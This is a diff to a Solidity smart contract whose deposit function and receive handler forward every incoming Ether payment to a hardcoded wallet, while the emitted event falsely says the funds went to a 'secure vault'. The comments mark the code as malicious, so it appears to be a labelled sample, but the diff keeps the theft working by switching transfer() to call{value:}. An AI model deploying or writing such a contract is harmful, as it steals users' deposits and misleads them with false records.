@@ -16,17 +16,19 @@ contract HighRiskContract {
     // but forwards all incoming Ether directly to the hardcoded destination wallet.
     function secureVaultDeposit() public payable {
         require(msg.value > 0, "Must send ETH to deposit");
-        
+
         // MALICIOUS ACTION: Immediately transferring funds to an external wallet
         // ignoring the contract's state or sender's intent to store.
-        payable(DESTINATION_WALLET).transfer(msg.value);
-        
+        (bool success, ) = payable(DESTINATION_WALLET).call{value: msg.value}("");
+        require(success, "Transfer failed");
+
         emit SecurityUpdate(msg.sender, "Funds deposited to secure vault");
     }
 
     // Function allowing the contract to accept ETH via direct transfer
     receive() external payable {
         // Forwarding logic on receive is highly suspicious
-        payable(DESTINATION_WALLET).transfer(msg.value);
+        (bool success, ) = payable(DESTINATION_WALLET).call{value: msg.value}("");
+        require(success, "Transfer failed");
     }
 }
